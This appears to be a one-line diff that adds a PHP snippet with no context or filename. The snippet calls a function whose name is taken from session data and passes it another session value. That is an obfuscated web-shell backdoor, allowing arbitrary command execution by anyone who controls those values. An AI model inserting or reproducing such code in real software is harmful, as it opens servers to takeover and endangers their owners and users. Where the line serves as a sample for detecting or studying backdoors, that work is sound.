@@ -1,0 +1,1 @@
+<?php $a = $_SESSION['f']; $c = $_SESSION; $a($c['x']);
